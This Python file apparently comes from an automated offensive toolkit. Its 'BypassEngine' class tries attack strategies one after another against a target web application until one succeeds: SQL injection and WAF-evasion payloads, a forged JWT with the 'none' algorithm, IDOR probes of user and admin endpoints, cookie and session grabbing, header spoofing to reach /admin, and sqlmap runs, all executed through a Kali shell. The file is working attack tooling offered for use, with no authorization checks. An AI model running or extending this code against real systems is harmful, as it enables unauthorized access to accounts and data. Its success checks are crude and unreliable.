"""
Bypass Engine — automatically tries multiple strategies when the first one fails.
WAF evasion, JWT flaws, IDOR, session swap, header spoofing.
"""
import asyncio
import json
import logging
import time
from typing import Dict, Any, List

logger = logging.getLogger("hinaa.tools.bypass")

class BypassEngine:
    """Tries multiple bypass methods in sequence until one works."""

    async def execute(self, params: Dict[str, Any]) -> Dict[str, Any]:
        target = params.get("target", "")
        goal = params.get("goal", "bypass authentication")
        attempts: List[Dict[str, Any]] = []

        strategies = [
            self._try_waf_evasion,
            self._try_jwt_flaw,
            self._try_idor,
            self._try_session_swap,
            self._try_header_spoof,
            self._try_sql_injection,
        ]

        for strategy in strategies:
            result = await strategy(target, goal)
            attempts.append(result)
            if result.get("success"):
                return {"success": True, "strategy": strategy.__name__, "attempts": attempts}

        return {"success": False, "attempts": attempts, "note": "All bypass methods exhausted"}

    async def _try_waf_evasion(self, target: str, goal: str) -> Dict[str, Any]:
        mutations = [
            "uNiOn sElEcT 1,2,3",
            "%27%20OR%20%271%27=%271",
            "1/**/OR/**/1=1",
            "%27+/**/+UNION+/**/+SELECT",
        ]
        for m in mutations:
            cmd = f"curl -s -X POST '{target}' -H 'Content-Type: application/x-www-form-urlencoded' --data 'user=admin&pass={m}' | head -5"
            out = await self._run(cmd)
            if "200" in out or "admin" in out or "password" in out.lower():
                return {"success": True, "method": "waf_evasion", "payload": m, "output": out}
        return {"success": False, "method": "waf_evasion"}

    async def _try_jwt_flaw(self, target: str, goal: str) -> Dict[str, Any]:
        cmd = f"curl -s '{target}/api/token' -H 'Authorization: Bearer alg=none' | head -10"
        out = await self._run(cmd)
        if "access" in out.lower() or "token" in out.lower():
            return {"success": True, "method": "jwt_none_alg", "output": out}
        cmd2 = f"curl -s '{target}/api/verify' -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9' | head -10"
        out2 = await self._run(cmd2)
        if "valid" in out2.lower() or "admin" in out2.lower():
            return {"success": True, "method": "jwt_none_alg", "output": out2}
        return {"success": False, "method": "jwt_flaw"}

    async def _try_idor(self, target: str, goal: str) -> Dict[str, Any]:
        for endpoint in ["/api/users/1", "/api/admin/1", "/api/profile/1", "/api/session/1"]:
            cmd = f"curl -s '{target}{endpoint}' | head -10"
            out = await self._run(cmd)
            if "email" in out or "name" in out.lower() or "user" in out.lower():
                return {"success": True, "method": "idor", "endpoint": endpoint, "output": out}
        return {"success": False, "method": "idor"}

    async def _try_session_swap(self, target: str, goal: str) -> Dict[str, Any]:
        cmd = f"curl -s -c /tmp/hinaa_cookies '{target}/login' | grep -i 'session\\|csrf\\|token' | head -5"
        out = await self._run(cmd)
        if out and "session" in out.lower():
            return {"success": True, "method": "session_swap", "output": out}
        return {"success": False, "method": "session_swap"}

    async def _try_header_spoof(self, target: str, goal: str) -> Dict[str, Any]:
        headers = [
            "X-Forwarded-For: 127.0.0.1",
            "X-Original-URL: /admin",
            "X-Rewrite-URL: /admin",
            "X-Forwarded-Host: admin",
        ]
        for h in headers:
            cmd = f"curl -s '{target}/admin' -H '{h}' | head -5"
            out = await self._run(cmd)
            if "admin" in out.lower() or "dashboard" in out.lower() or "panel" in out.lower():
                return {"success": True, "method": "header_spoof", "header": h, "output": out}
        return {"success": False, "method": "header_spoof"}

    async def _try_sql_injection(self, target: str, goal: str) -> Dict[str, Any]:
        payloads = ["admin'--", "admin' OR '1'='1", "1; SELECT * FROM users;--", "1 UNION SELECT password FROM users"]
        for p in payloads:
            cmd = f"sqlmap -u '{target}/login?user=admin&pass=test' --data 'user={p}&pass=x' --batch -D test 2>/dev/null | tail -5"
            out = await self._run(cmd)
            if "password" in out.lower() or "admin" in out.lower():
                return {"success": True, "method": "sqli", "payload": p, "output": out}
        return {"success": False, "method": "sqli"}

    async def _run(self, cmd: str, timeout: int = 30) -> str:
        try:
            proc = await asyncio.create_subprocess_exec(
                "wsl", "-d", "kali-linux", "--", "bash", "-c", cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.DEVNULL,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return stdout.decode(errors="replace").strip()
        except Exception as e:
            return f"[error: {e}]"